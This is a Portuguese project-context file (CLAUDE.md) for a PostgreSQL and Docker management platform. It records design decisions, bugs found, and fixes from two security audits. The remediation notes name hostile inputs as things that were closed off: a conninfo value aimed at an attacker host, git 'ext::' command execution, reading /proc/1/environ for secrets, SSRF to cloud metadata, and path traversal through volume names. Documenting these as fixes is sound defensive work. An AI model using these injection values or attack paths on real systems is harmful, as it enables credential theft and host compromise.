# CLAUDE.md — gest-postgres

Contexto do projeto pra qualquer sessão futura. Ler antes de trabalhar.

## O que é

Plataforma de gestão de instâncias PostgreSQL em Docker: provisionar servidor via UI, configurar tudo do Postgres visualmente, gerenciar extensões, monitorar métricas (Postgres + SO), backup/restore. Público: iniciante (modo Simples, presets) e DBA (modo Avançado, 100% dos parâmetros).

- Ideia original / justificativa de stack: [IDEIA.md](./IDEIA.md)
- Lista completa de requisitos (produto final, todas as "perfumarias"): [REQUISITOS.md](./REQUISITOS.md)

**Fase atual: MVP.** Foco só na seção "Escopo MVP" abaixo. Não implementar itens de "Backlog pós-MVP" sem pedido explícito do usuário, mesmo que estejam documentados em REQUISITOS.md.

## Stack decidida

- **Backend**: Go. `docker/docker/client` (Docker Engine API), `pgx` (driver Postgres), goroutines pra polling de métricas.
- **Frontend**: React + Next.js + shadcn/ui + TanStack Query + Recharts/Tremor pros gráficos.
- **Tempo real**: WebSocket direto do backend Go (`gorilla/websocket` ou `nhooyr.io/websocket`), sem reinventar no front.
- **Banco de metadados**: Postgres separado (servidores registrados, users da plataforma, histórico de config, auditoria, agendamento de backup) — não confundir com os Postgres gerenciados.
- **Docker socket**: nunca acesso direto. Usar `docker-socket-proxy` (`tecnativa/docker-socket-proxy`) liberando só create/start/stop/inspect.

Ainda não decidido / definir quando chegar lá: estrutura de pastas, ORM/query builder no Go (ou SQL puro com `pgx`), lib de auth, formato de deploy final (compose vs binário + compose gerado).

### Extensões
- [x] ~~Listar `pg_available_extensions`~~
- [x] ~~Habilitar/desabilitar: `pg_stat_statements`, `uuid-ossp`, `pgcrypto`, `pg_trgm`~~ (e qualquer outra da lista, não só essas 4)

`postgres:X` oficial não vem com `pgvector` nem `pg_cron` compilados — servidores novos agora sobem em cima de `gestpg-postgres:X` (`postgres-image/Dockerfile`), a mesma imagem oficial + esses dois pacotes via apt (repo PGDG que a própria imagem já tem configurado). Buildada localmente pelo `setup.sh` uma vez por versão suportada (13-17) — o backend só faz pull/inspect na criação de servidor, nunca build (permissão do docker-socket-proxy é só isso de propósito). `pgvector` funciona na hora (`CREATE EXTENSION vector`, sem restart). `pg_cron` precisa de `shared_preload_libraries` + `cron.database_name`, mesmo tratamento que já existia pra `pg_stat_statements` — clique em "Habilitar" na aba Extensões cuida disso sozinho (reinicia o container, demora mais, badge "requer restart" avisa antes).

Achado e corrigido um bug sério do próprio Postgres nesse processo: `ALTER SYSTEM SET shared_preload_libraries = 'lib1,lib2'` (uma string só com vírgula dentro) faz o Postgres persistir errado no `postgresql.auto.conf` — grava `= '"lib1,lib2"'` com aspas duplas extras envolvendo tudo, e na subida seguinte ele tenta abrir UM arquivo de lib chamado literalmente "lib1,lib2" e trava em crash loop pra sempre. A sintaxe correta é multi-valor (`ALTER SYSTEM SET shared_preload_libraries = lib1, lib2` — identificadores soltos, sem string por fora). Servidores já existentes com só 1 lib preload nunca bateram nesse bug (só aparece com 2+).

Servidores criados antes dessa mudança continuam na imagem `postgres:X` antiga — sem pgvector/pg_cron disponíveis até serem recriados. Sem migração automática no MVP.

### Connection pooling (PgBouncer)
- [x] ~~Connection pooling gerenciado~~ — toggle "Habilitar"/"Desabilitar" na aba Configuração de cada servidor (card abaixo do form de parâmetros)

Sobe um container `edoburu/pgbouncer` companheiro por servidor (nome `{container}-pgbouncer`, sem volume — é stateless, a imagem gera `pgbouncer.ini`/`userlist.txt` sozinha a partir de env vars no boot), numa porta publicada própria alocada da mesma faixa dos servidores. Cliente troca só a porta (mesmo usuário/senha/banco) e passa a falar com o pooler em vez do Postgres direto. Modo de pool escolhível (`transaction` default, `session`, `statement`).

Achado no processo: `AUTH_TYPE=md5` (o default mais comum em tutoriais de pgbouncer) quebra contra qualquer role criada com o `password_encryption` default do Postgres desde a v10+ (`scram-sha-256`) — erro "wrong password type" tanto pro lado cliente→pgbouncer quanto pgbouncer→Postgres. Usa `AUTH_TYPE=scram-sha-256` de propósito.

Excluir o servidor remove o pooler junto (best-effort, não trava a exclusão do Postgres se falhar). Rotacionar a senha do superuser recria o container do pooler com a senha nova — sem isso o pooler ficaria autenticando com credencial velha silenciosamente, mesma classe do bug de rotação de senha já corrigido antes (ver histórico de commits). Trocar a porta do Postgres (editar servidor) não precisa recriar o pooler — ele fala com o Postgres pelo nome do container, não pela porta publicada.

### Backup / Restore
- [x] ~~Backup manual sob demanda (`pg_dump`, formato custom)~~ — aba "Backup" de cada servidor
- [x] ~~Rotina agendada simples (cron básico: diário/semanal, horário)~~
- [x] ~~Storage local~~ **e Google Drive** (saiu do MVP original, pedido explícito do usuário fora de ordem)
- [x] ~~Restore de backup (sobrescrever servidor original ou criar novo)~~
- [x] ~~Retenção simples: manter últimos N backups~~

`pg_dump`/`pg_restore` rodam DIRETO de dentro do container do backend (não via `docker exec` no container gerenciado — mesma decisão de segurança do resto do projeto, o docker-socket-proxy nunca libera `EXEC`). O binário do cliente é a versão 17 (Alpine 3.21, bump de 3.19 porque esse pacote só existe a partir daí) — cobre dump de servidores v13-17 porque `pg_dump` só consegue falar com Postgres da mesma versão ou mais velho, nunca mais novo. Conecta pelo nome do container na rede `gestpg-managed`, igual toda outra operação do backend.

Arquivo local fica num volume Docker próprio (`backups_data`, montado em `/backups` no backend) — nunca bind mount do host. Backup pro Google Drive não guarda cópia local nenhuma: o dump escreve num arquivo temporário (`/backups/tmp`), sobe em streaming (multipart via `io.Pipe`, nunca carrega o arquivo inteiro em memória — dumps grandes podem ser vários GB) pra uma pasta própria (`gest-postgres-backups`) na conta configurada, e o temporário é apagado. Restore faz o caminho inverso: baixa (do Drive) ou abre direto (local) antes de rodar `pg_restore --clean --if-exists`.

Restore tem dois modos: sobrescrever um banco já existente (apaga tudo que tinha antes) ou criar um banco novo do zero e restaurar nele, sem tocar no original.

"Cron básico" é literal — sem parser de expressão cron de verdade, só frequência (diária/semanal + dia da semana) e horário (UTC), checado a cada 1 minuto contra o último `last_run_at` de cada política habilitada. Retenção (`retention_count`) só conta backups gerados POR AQUELA política — um backup manual nunca é apagado automaticamente por nenhuma política.

Google Drive: cada instalação usa o próprio app OAuth do dono (client_id/secret cadastrado nas configurações — a plataforma não embute nenhuma credencial Google própria). Fluxo padrão: gera URL de consentimento (`access_type=offline&prompt=consent`, garante que a Google devolve `refresh_token` de verdade, não só um `access_token` que expira em 1h), usuário autoriza no navegador dele mesmo (não tem como isso ser automatizado — é a própria Google pedindo login da conta), callback troca o code pelo token e guarda o `refresh_token` cifrado. Implementado com `golang.org/x/oauth2` + chamadas HTTP diretas pra Drive API v3 REST (upload/download/delete), de propósito sem o SDK `google.golang.org/api` — evita puxar uma árvore de dependência bem maior pra só 3 operações.

Testado ponta a ponta no droplet: backup manual local (dump → completo → download → restore em banco novo → restore sobrescrevendo banco existente → delete), e política agendada rodada 3x manualmente com `retention_count=2` confirmando que só os 2 backups mais recentes DAQUELA política sobrevivem (arquivo em disco e registro no banco de metadados, os dois). Integração com Google Drive testada só até a geração da URL de consentimento e o roundtrip da API — a autorização de verdade depende de credenciais OAuth reais que só o dono da conta Google consegue gerar/conceder.

CPU/memória/rede/I/O continuam sendo soma dos containers Docker (sem acesso ao host além da API Docker pra esses); **disco é exceção** — número real do host (total/usado/livre), via `statfs` num mount read-only só de `/etc` (não a raiz inteira, de propósito — é o bastante pra medir o mesmo filesystem que `/` num droplet de disco único sem expor a árvore toda) dentro do container do backend. Rede agora é taxa de verdade (bytes/s, calculada por delta entre amostras do histórico), não mais só acumulado.

Achado nessa leva: containers em host cgroup v2 reportam `blkio_stats` com `op` minúsculo (`"read"/"write"`), não maiúsculo (`"Read"/"Write"` como cgroup v1) — sem tratar os dois casos, I/O de disco por container sempre dava zero.

**Bug achado depois, reportado pelo usuário**: o card "Memória" do dashboard mostrava um total absurdo (ex: "de 14665 MB" numa máquina de ~1.9GB real, confirmado comparando com o EasyPanel no mesmo host). Causa: `TotalMemoryLimitMB` somava o `MemoryLimitMB` de CADA container — container sem limite explícito de memória reporta o host inteiro como seu próprio "limite" (fallback do cgroup pra "sem limite"), então somar isso entre vários containers sem limite (a maioria, só Postgres gerenciado ganha limite explícito) infla o total pra um múltiplo do real. Corrigido: memória total agora vem do `/info` do Docker (`MemTotal`, `docker.HostMemoryTotalBytes`) — mesmo raciocínio já usado pro disco (fonte real do host, não soma de container). CPU/rede/I/O continuam sendo soma dos containers (não tem bug equivalente ali: CPU% já é calculado por delta, não por limite; rede/I/O são contadores acumulados, não limites).

"Peso do container" generalizado pra QUALQUER container, não só Postgres gerenciado: soma dos volumes nomeados montados quando tem, senão cai pro tamanho da camada gravável (`SizeRw`, via `docker system df`) — nunca usa `SizeRootFs` porque esse conta a imagem base inteira, inflando o número de qualquer container que compartilhe imagem com outro.

**Além do MVP**: botão "Verificar atualização" no header do dashboard — compara o commit rodando com o HEAD do branch `main` no GitHub (API pública, sem token, repo é público) e mostra se tá atualizado ou não, com o commit/data/mensagem mais recente e o comando pra atualizar (`git pull && sudo ./setup.sh`) pronto pra copiar. Precisou de infraestrutura nova: `GIT_COMMIT` embutido no binário do backend via ldflags em build time (`internal/version.Commit`), passado como build arg do `docker-compose.yml` a partir de `git rev-parse --short HEAD` que o `setup.sh` exporta antes do `docker compose up --build`. Build manual (sem passar pelo `setup.sh`) fica com commit "dev" — a UI detecta isso e avisa que não dá pra comparar, em vez de comparar errado. **Ganhou aplicação automática na Leva 7 (ver abaixo)** — o texto acima descreve só a checagem; o botão "Atualizar agora" que aplica de verdade é posterior.

Auto-descoberta (via botão "Procurar servidores") ganhou um segundo caminho de entrada: clicar direto numa linha da tabela de containers do dashboard, quando ela parece Postgres e ainda não é gerenciada (badge "adotar"), abre o mesmo formulário de cadastro. Containers do próprio stack (`metadata-db`, `backend`, `frontend`, `docker-socket-proxy`) são sempre excluídos dessa detecção mesmo quando a imagem bate na heurística — `metadata-db` É um Postgres de verdade, só que é o interno da plataforma, nunca deveria virar "servidor gerenciado" adotável.

Todo gráfico (os 4 cards do dashboard e os 3 da aba Monitoramento de cada servidor: CPU/Memória/Conexões) agora é clicável — abre um modal com o gráfico ampliado e botões de período (5min/15min/30min/tudo). Importante: isso recorta o mesmo buffer em memória que já existe (~1h a 15s/amostra), não busca dado mais antigo no backend — não tem armazenamento de métricas de longo prazo no MVP, então "mudar o período" é só zoom dentro do que já foi coletado desde que o backend subiu.

## Gestão genérica de Docker (fora do escopo original — pedido explícito, 2026-07-18)

Pedido explícito do usuário, fora de ordem em relação ao MVP original ("não é só Postgres, quero gerenciar Docker de forma genérica") — autorização ampla, decidi arquitetura e implementei sem pausar. Plano completo em [docs/INFRA_PLAN.md](./docs/INFRA_PLAN.md). Nova seção "Docker" na tela inicial (`/infra`), separada da gestão de servidores Postgres.

- [x] ~~Containers/networks/volumes genéricos~~ (start/stop/restart/remover qualquer container do host, não só servidores gerenciados; criar/remover rede e volume; ver logs) — reaproveita o `internal/docker` (Engine API via docker-socket-proxy) que já era genérico por baixo, só a camada `server` que era amarrada a "servidor cadastrado". Proteções: nunca deixa apagar as redes/volumes fixos da própria plataforma nem o volume de dados de um servidor gerenciado (esse tem fluxo próprio, com sua confirmação).
- [x] ~~Deploy via `docker-compose.yml`~~ e ~~build via Dockerfile~~ (com ou sem contexto extra via upload `.tar`/`.tar.gz`) — backend chama `docker compose`/`docker build` via `os/exec` de dentro do próprio container (CLI instalado na imagem, fala pelo mesmo `DOCKER_HOST` do proxy) em vez de reimplementar orquestração de compose na unha. Nova categoria `BUILD` no docker-socket-proxy — `EXEC` continua desligado, nunca dá shell dentro de container gerenciado.
- [x] ~~Traefik (reverse proxy) + domínio + SSL automático via Let's Encrypt~~ — container gerenciado, rotas via file provider (arquivo YAML por domínio, nunca precisa recriar o container alvo pra rotear), ACME HTTP-01 (só precisa da porta 80 alcançável, sem credencial de DNS). - [x] ~~Firewall do host (ufw)~~ — única peça que não dava pra fazer só com docker-socket-proxy, porque `ufw` mexe no namespace de rede do HOST, não do container. Achado nessa leva: `ufw status` não mostra nada enquanto o firewall tá inativo, mesmo com regra já gravada (`ufw show added` confirma que existe) — o agente cai pro `show added` quando detecta `ufw` inativo, senão a listagem mentia "vazio" no primeiro uso, antes do primeiro `ufw enable`.

Testado ponta a ponta no droplet: stack real via compose (nginx respondendo na porta publicada), build com Dockerfile puro e com contexto via upload (arquivo copiado de verdade confirmado dentro da imagem), rota de domínio via Traefik roteando de verdade (`curl` com `Host:` forjado, sem DNS real) pro container alvo, e firewall-agent com `ufw` instalado mas deliberadamente **nunca habilitado** durante o teste (`ufw allow`/`delete` funcionam no ruleset independente do estado ativo/inativo) — testado assim de propósito pra nunca arriscar travar o próprio acesso SSH usado pra testar tudo isso.

Mudanças com maior chance de precisar de atenção num primeiro teste real:
- **CORS agora é allowlist, não reflexão de Origin** — `ALLOWED_ORIGINS` (novo, no `.env`/`docker-compose.yml`/`setup.sh`, populado automaticamente com o IP público detectado). Se o front for acessado por uma origem que não está nessa lista (domínio novo, porta diferente), as requisições passam a falhar por CORS — precisa adicionar em `ALLOWED_ORIGINS` (separado por vírgula).
- **Cookie de sessão ganhou `Secure` dinâmico** (só quando a requisição já chega por HTTPS, via `X-Forwarded-Proto` ou TLS direto) — instalação padrão em HTTP puro continua funcionando igual (não força HTTPS, só aproveita quando já existe).
- **Leitura de arquivo de container/volume virou admin-only** (antes era GET, liberado pra `viewer`) — fechava o caminho mais crítico do relatório: `viewer` lendo `/proc/1/environ` do próprio container do backend pra roubar `CREDENTIAL_ENCRYPTION_KEY` e decifrar todo segredo guardado. Escrita/upload/exclusão de arquivo de container/volume também passaram a exigir step-up (`requireElevated`), paridade com o file manager de host que já tinha isso.
- **Containers da própria plataforma** (`backend`, `metadata-db`, `docker-socket-proxy`, `frontend` — identificados pelo label `com.docker.compose.service`, mesmo mecanismo já usado pela auto-descoberta) **ficaram fora de alcance do file manager de container**, e `/proc` foi bloqueado como caminho em qualquer container.
- **`git clone` (criar container via Git, deploy automático, webhook)** ganhou allowlist de esquema (http/https/ssh + sintaxe SCP), bloqueio de `::` (mata o transporte `ext::`, que executava comando arbitrário dentro do container do backend) e de argumento começando com `-`, `--` antes dos posicionais, e `GIT_ALLOW_PROTOCOL` como cinto-e-suspensório. Esse era o item CRÍTICO/RCE do relatório.
- **Token de PAT do Git não vai mais no argv do `git clone`** — antes ficava embutido na URL (legível via `/proc/<pid>/cmdline` por qualquer processo no container), agora só o username (ou o placeholder `x-access-token`) vai na URL e o segredo passa por `GIT_ASKPASS` (env var, mesma classe de exposição já aceita pro path da chave SSH).
- **`ufw route allow/deny` agora funciona de verdade** — antes, porta publicada por container (28080/4173) sempre bypassava o `ufw` inteiro (Docker insere regra na cadeia `nat`/`DOCKER` antes do `INPUT` do ufw). `setup.sh` agora aponta a cadeia `DOCKER-USER` pra `ufw-user-forward`; isso NÃO bloqueia nada sozinho (seria quebrar o acesso direto por IP:porta que o resto do setup promete "funciona de cara"), só habilita o mecanismo — quem quiser restringir 28080/4173 depois que tiver domínio+Traefik na frente já pode.
- **Backend ganhou `cap_drop: [ALL]` + `no-new-privileges`** no compose — não migrou pra usuário não-root (precisaria de uma segunda leva coordenando ownership do `HOST_FILES_ROOT`, dos volumes Docker criados automaticamente e do socket do `firewall-agent`, todos hoje assumindo root; risco de quebrar em produção sem conseguir testar ao vivo superou o benefício nessa leva).
- **Mount de `/etc` (medição de disco) virou só `/etc/hostname`** (um arquivo, não o diretório inteiro) — `statfs` só precisa de QUALQUER caminho no mesmo filesystem, não precisa enxergar `shadow`/`ssh`/`sudoers`.
- **`.env` ganhou `chmod 600`** (idempotente, roda em toda execução do `setup.sh`, não só na criação) — antes ficava com a permissão default do umask, world-readable em host multiusuário.
- **`state` do OAuth do Google Drive deixou de ser a constante fixa `"gestpg"`** — agora é aleatório (32 bytes), guardado com expiração de 10 min e checado no callback (nova migration `0018_gdrive_oauth_state.sql`). Fechava um CSRF de vinculação de conta: um atacante conseguia induzir um admin logado a vincular a CONTA GOOGLE DELE, redirecionando todo backup futuro pro Drive do atacante.
- **Token do bot Telegram parou de vazar em erro/log** — `postJSON` redige `api.telegram.org/bot<token>` antes de qualquer erro de transporte virar log ou resposta 422 da API (botão "Testar" canal).
- **`webhook_url`** (canal de notificação e regra de alerta direta) **ganhou guarda de SSRF** — resolve o host e recusa loopback/link-local/privado (bloqueia `169.254.169.254` de metadata de nuvem, `localhost`, etc); cliente HTTP interno também parou de seguir redirect.
- **`database` no backup manual e em política agendada** ganhou a mesma validação (`identRegex`) que `CreateDatabase`/restore já tinham — fechava dois problemas de uma vez: path traversal (`database` virava segmento de nome de arquivo) e injeção de conninfo no `pg_dump -d` (um valor tipo `dbname=x host=atacante.com` redirecionava a conexão, com `PGPASSWORD` no ambiente, pro host do atacante).
- **`VolumeName`** (anexar volume a container, file manager de volume, backup/restore de volume genérico) **ganhou validação de formato** — sem isso um valor tipo `"/"` virava bind da RAIZ DO HOST no container (Docker trata bind de host e volume nomeado pelo mesmo campo), e `:` embutido injetava um terceiro campo no bind spec. Achado nessa mesma passada, fora do relatório original: `BackupVolume`/`RestoreVolumeBackup` faziam `filepath.Join`/`MkdirAll`/`os.Create` com o volume ainda não validado ANTES de chegar na validação mais tardia — um volume tipo `"../../etc/algo"` criava diretório fora do volume de backups antes de qualquer checagem barrar.
- Endurecimentos menores: `RecreateContainerWithLabels`/rotas via Traefik ganharam guarda de host interno + rejeição de aspas/quebra de linha no `target_url`/`redirect_target` (SSRF + escape de YAML); `pg_hba.conf` passou a rejeitar espaço/tab embutido nos campos (smuggling de token); histórico de SQL do editor foi de `localStorage` (sobrevivia a logout) pra `sessionStorage` + limpeza explícita no logout; frontend ganhou CSP + `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff`; JSON de request tem limite de 10MB (`io.LimitReader`) e o servidor HTTP ganhou `ReadTimeout`/`IdleTimeout` (sem `WriteTimeout`, de propósito — quebraria download de arquivo grande e o WebSocket do terminal); login ganhou throttle por IP (não por username, pra não deixar um atacante trancar o admin de verdade) com backoff exponencial, e comparação contra hash dummy quando o usuário não existe (fecha enumeração por timing); rota de webhook do Git passou a casar o padrão exato da rota (antes era só sufixo `/webhook`, tornando pública por engano qualquer rota futura terminando assim); `resolveHostPath` passou a devolver o caminho já resolvido (pós-symlink) em vez do caminho cru, fechando um TOCTOU; `validateFilename` passou a rejeitar `.`/`..`.
- **Não mudado, decisão consciente**: o modelo de privilégio Docker de fundo (`docker-socket-proxy` com `POST+CONTAINERS+EXEC+BUILD` = container privilegiado/bind de host = root no host) segue como estava — o próprio relatório reconhece que não dá pra tornar isso seguro só filtrando o corpo da requisição pelo proxy atual; mitigado até onde dava (validação de `VolumeName`), o resto é a natureza de uma plataforma que deliberadamente dá gestão Docker genérica pro admin. O filtro de SQL só-por-`;` em `DropFunction`/CHECK de domínio/DEFAULT de coluna também não mudou — são admin-only (que já roda SQL cru pelo editor) e o próprio relatório classificou como "não cruza fronteira de privilégio", só cosmético.
- **Item 32 (`sslmode=disable`) fechado depois, via bug real**: usuário tentou adotar (auto-descoberta) um container que na verdade era o PgBouncer da stack DELE (não o nosso), configurado com `client_tls_sslmode` exigindo TLS dos clientes — nossa validação de credencial (`waitPostgresReady`) e toda conexão a servidor já registrado (`connectTo`, `pgconn.go`) usavam `sslmode=disable` fixo, então a tentativa falhava com `FATAL: SSL required (SQLSTATE 08P01)` antes até de checar usuário/senha. Trocado pra `sslmode=prefer` nos dois pontos — tenta TLS, cai pra texto puro se o alvo não oferecer, então continua funcionando sem mudança nenhuma contra os Postgres gerenciados por essa plataforma (que não têm SSL configurado) e passa a funcionar contra qualquer alvo (adotado ou não) que exija TLS. `pg_dump`/`pg_restore` (backup) nunca precisaram desse fix — já usam o default do libpq (`prefer`) por não setarem `sslmode` no comando.

### Leva 7 — botão "Atualizar agora" aplica update de verdade (2026-07-21)

Pedido explícito do usuário, reverte uma decisão de arquitetura anterior ("nunca aplica nada sozinho, só informa" — ver Plataforma acima). Confirmado com o usuário antes de implementar (`AskUserQuestion`): aceitar o risco de auto-aplicar `git pull && sudo ./setup.sh` com privilégio de root no host, gatilhado por um clique na UI, com step-up de senha como trava extra. **Não testado num droplet real ainda** — só `go build`/`go vet` (linux) do novo módulo + do backend, `tsc`/`eslint`/`next build` do frontend. Antes de considerar isso "pronto" de verdade: rodar `sudo ./setup.sh` num droplet, esperar uma atualização de verdade ficar disponível (ou forçar testando contra um fork com 1 commit à frente) e clicar "Atualizar agora" de ponta a ponta.

- **`update-agent/`** — novo binário Go, módulo próprio (mesmo padrão do `firewall-agent/`), roda como serviço systemd no HOST (nunca em container — a pipeline precisa de root no host pra `sudo ./setup.sh`... na prática nem precisa de `sudo`, já que o próprio serviço já roda como root, igual o `firewall-agent`). Escuta só em `/run/gestpg-update.sock`, bind mount no backend, mesma superfície mínima do padrão já estabelecido: dois endpoints (`GET /status`, `POST /apply`), nenhum aceita parâmetro — a pipeline disparada é sempre a mesma fixa (`git pull` no repo configurado em install time via `GESTPG_REPO_DIR` + `./setup.sh` desse repo), sem comando arbitrário vindo da API em hipótese nenhuma.
- **Problema de arquitetura resolvido**: o próprio `setup.sh` reinstala e reinicia o `update-agent` a cada execução (mesmo motivo do `firewall-agent` — pegar código novo do agente sem depender de reboot manual, bug já corrigido antes pro firewall na Leva 4). Se a pipeline (`git pull && ./setup.sh`) rodasse como filho direto do processo do agente, `systemctl restart gestpg-update-agent` — chamado pelo PRÓPRIO `setup.sh` que a pipeline tá executando — mataria a pipeline no meio, porque o systemd mata todo processo do cgroup do serviço ao reiniciar, não só o PID principal. Resolvido rodando a pipeline numa **unit systemd transiente separada** (`systemd-run --unit=... --collect`), cgroup independente do `update-agent.service` — sobrevive tranquilamente ao agente reiniciar (ou até cair) no meio do próprio update que ele disparou. Estado (`running`/`success`/`failed`) e log ficam em arquivo em disco (`/var/log/gestpg-update.log` + `.state.json`), nunca em memória do processo, pelo mesmo motivo.
- **Autocura**: se o host reiniciar (ou o processo cair) no meio de um update, o estado fica preso em "running" pra sempre — `GET /status` detecta isso (`systemctl is-active` na unit transiente registrada no estado não bate) e volta pra `unknown`, destravando o botão de tentar de novo em vez de travar pra sempre.
- **Vazamento de segredo fechado antes de existir**: `setup.sh` ecoa a senha de admin (`ADMIN_PASSWORD`) em texto puro no fim de TODA execução bem-sucedida, não só na primeira instalação — sem tratamento, isso apareceria no log dessa atualização, exposto via `GET /api/v1/update/status` pra qualquer sessão admin. `update-agent` redige a linha `login: admin / ...` antes de devolver o log tail. Também limpa os códigos de cor ANSI que `log()`/`ok()`/`warn()` do `setup.sh` imprimem, senão o log renderizado no navegador vira sopa de caracteres de escape.
- **Trava de segurança**: `POST /api/v1/update/apply` exige sessão **elevada** (`requireElevated`, step-up de senha — mesmo mecanismo do gerenciador de arquivos do host), não só admin. É a ação de maior blast radius de toda a API — comando com privilégio de root no host inteiro, não só num container — então recebe a trava mais forte que a plataforma já tem. `GET /api/v1/update/status` é admin-only (log operacional que viewer não precisa ver).
- **Zero superfície de injeção**: nenhum dado da requisição HTTP chega perto de um shell — o script que roda dentro da unit transiente é uma string FIXA no binário do `update-agent`, tudo que varia (caminho do repo, dos arquivos de log/estado) chega via variável de ambiente (`--setenv=` do `systemd-run`), nunca concatenado em texto de comando.
- **Nenhuma reversão automática**: se `git pull` falhar (repo com mudança local não commitada, por exemplo), a pipeline simplesmente falha e reporta — nunca faz `git reset --hard`/`git clean -f` sozinho pra "resolver" o conflito. Falha visível > "conserto" automático que descarta trabalho de quem administra o host.
- **Frontend**: `update-checker.tsx` ganhou seção nova abaixo do aviso de "atualização disponível" — botão "Atualizar agora" (pede step-up se a sessão ainda não tá elevada), progresso com spinner + log tail ao vivo (polling a cada 3s enquanto `status === "running"`), sucesso com botão "Recarregar página", falha/interrupção com log + botão "Tentar de novo". Sobrevive à troca do próprio container do backend no meio do processo (o `docker compose up --build -d` do `setup.sh` recria o backend) porque o estado de verdade mora no `update-agent` (host), não em memória do backend — o polling só perde 1-2 ciclos durante a troca e volta a funcionar sozinho contra o backend novo.
- Se `update-agent` não estiver instalado/rodando (droplet ainda não passou por essa versão do `setup.sh`), a seção de aplicar fica escondida e a UI cai de volta pro comportamento anterior (só mostra o comando pra copiar).

### Leva 8 — remediação da 2ª auditoria de segurança (2026-07-21)

Pedido explícito do usuário a partir de um segundo relatório (`RELATORIO_SEGURANCA_2026-07-21.md`, não gerado nesta sessão — verifica a remediação da Leva 6 contra o código atual e acha achado novo). 17 itens: 1 crítico, 3 altos, 6 médios, 7 baixos. Todos fechados nessa leva. Verificado só via `go build`/`go vet`/`go test` (sem teste nenhum no repo ainda) dos três módulos Go + `tsc`/`eslint`/`next build` do frontend, e um teste ao vivo pontual do CSP (subiu `next start`, abriu a tela de login com Chrome de verdade via `claude-in-chrome`, confirmou zero erro de console e o header `Content-Security-Policy` sem `unsafe-eval`) — **o resto não rodou contra um droplet real**.

- **CRÍTICO fechado**: a causa-raiz das duas falhas críticas da Leva 6 nunca tinha sido corrigida — só os sintomas. A regra de autorização (`middleware.go`) é "qualquer `GET` passa pra `viewer`, só escrita exige admin" — e `GET .../inspect` (devolve `Config.Env` cru do container, sem gate) era funcionalmente idêntica ao buraco de `/proc/1/environ` que a Leva 6 achava ter fechado: `viewer` lia `CREDENTIAL_ENCRYPTION_KEY` (decifra todo segredo guardado) e `ADMIN_PASSWORD` (login direto como admin) do env do próprio container do backend. Fechado com `requireAdmin` em `inspect`/`logs`/`stats` (as três rotas irmãs, mesmo segredo vazava pelas três). Esse é o padrão que se repetiu nos 3 achados altos abaixo — **"GET = seguro pra viewer" continua sendo o modelo de fundo**, só remendado rota por rota de novo (mesma dívida que o relatório aponta como estrutural, registrada aqui e não resolvida por completo — trocar por autorização explícita por rota/capacidade fica pra uma leva futura se/quando justificar o esforço).
- **Altos**: throttle de login confiava em `X-Forwarded-For` sem checar se quem tá mandando é um proxy de verdade — atacante forjava um IP diferente por tentativa e o backoff nunca acumulava. Corrigido com `TRUSTED_PROXIES` (novo, `.env`/`docker-compose.yml`, vazio por padrão — só honra `X-Forwarded-For`/`-Proto` quando o peer imediato bate um CIDR configurado, e aí lê a entrada mais à direita do header, não a mais à esquerda). `gdrive/auth-url` e `gdrive/callback` eram `GET` sem `requireAdmin` — um `viewer` completava o próprio consentimento OAuth e sequestrava o destino de TODO backup futuro pra conta Google dele; fechado com `requireAdmin` nos dois (o cookie do admin de verdade, `SameSite=Lax`, continua passando na navegação de callback normal).
- **Médios**: `CREDENTIAL_ENCRYPTION_KEY` toda-zero (o valor placeholder do `.env.example`) passava pela validação de tamanho — `config.Load` agora rejeita explicitamente essa chave conhecida-pública no boot. Cadeia `DOCKER-USER -> ufw-user-forward` (Leva 6) não sobrevivia a reboot (`dockerd` recria a cadeia vazia) e só cobria IPv4 — virou um script próprio (`gestpg-docker-user-forward.sh`) reaplicado por uma unit systemd oneshot `After=docker.service`, cobrindo `ip6tables` também. Socket do `firewall-agent` (e do `update-agent`, mesmo bug, achado nessa mesma passada) era `0666` — qualquer usuário local do host, não só root, conseguia manipular regra de firewall (ou disparar `git pull && setup.sh` como root, no caso do update-agent); ambos os agentes rodam como root e o backend também, então `0660` já basta sem precisar inventar grupo dedicado. CSP tinha `unsafe-eval` desnecessário (React/Next não usam eval em produção) — removido, confirmado sem quebra via teste real no Chrome; `unsafe-inline` em `script-src` fica (nonce por requisição exige `proxy.ts` — nome novo do `middleware.ts` nesse Next 16 — forçando toda página a renderização dinâmica, trade-off de performance grande demais pra essa correção decidir sozinha, documentado como aceito). Download de backup de Postgres (`pg_dump` inteiro) e listagem de canal de notificação (`webhook_url` é segredo-portador pra Slack/Discord) viraram `requireAdmin`.
- **Baixos, os 7 juntos**: download-zip de pasta do host seguia symlink filho (`filepath.Walk` usa `Lstat`, não pulava symlink/não-regular antes do `os.Open`) — corrigido pulando qualquer entrada não-regular. Histórico de SQL (com senha em `CREATE ROLE ... PASSWORD`) só era limpo no botão de logout, não nos dois logouts automáticos (401 da API, falha de `/me`) — os dois agora chamam `clearAllQueryHistory()`. Sessão tinha só janela deslizante, sem teto absoluto — token roubado usado 1x a cada 30 dias nunca expirava; `created_at` (já existia na tabela) agora é checado contra um teto de 90 dias. SSRF (webhook de notificação, `target_url` do Traefik) validava só na criação — `100.64.0.0/10` (CGNAT) faltava no blocklist dos dois, e o cliente que dispara o webhook de verdade (`postJSON`) ganhou `DialContext` próprio que resolve e pina no IP validado no momento de conectar, fechando o TOCTOU de DNS rebinding entre cadastro e disparo (o lado Traefik não ganhou o dialer pinado — é config aplicada ao Traefik, não uma requisição HTTP nossa saindo pro destino, risco bem menor). Webhook do Git fazia lookup+decrypt do segredo antes de checar auth e devolvia 404 pra ID inexistente vs 401 pra assinatura errada (oráculo de ID, mitigado por já ser UUID) — unificado pra 401 igual nos dois casos, e ganhou throttle por IP próprio (única rota da API sem sessão de usuário, sem esse throttle não tinha limite nenhum). `backupFilePath` (volume genérico) não re-checava confinamento como o `resolveBackupPath` do lado Postgres já fazia — não explorável hoje (único escritor já valida `volumeName` antes), mas quebrava o idioma; alinhado. `git clone` aceitava `git://` (texto puro, sem auth, não serve pra repo privado, só superfície) e não checava host interno — removido `git` da allowlist de esquema, adicionado `isInternalHost` (mesma função do Traefik) pra `scheme://` e pra sintaxe curta de SSH (`user@host:path`).
- **Não mudado, decisão consciente**: os itens que o relatório já classificava como "dívida aceita, inalterada" na rodada 1 (proxy Docker com `EXEC+BUILD` = root no host, backend rodando como root sem migração de usuário coordenada, filtro de SQL só-`;` em rota admin-only, chave de criptografia sem AAD/rotação, senha admin ecoada no bootstrap) continuam fora de escopo dessa leva — são trade-offs estruturais, não bugs pontuais.

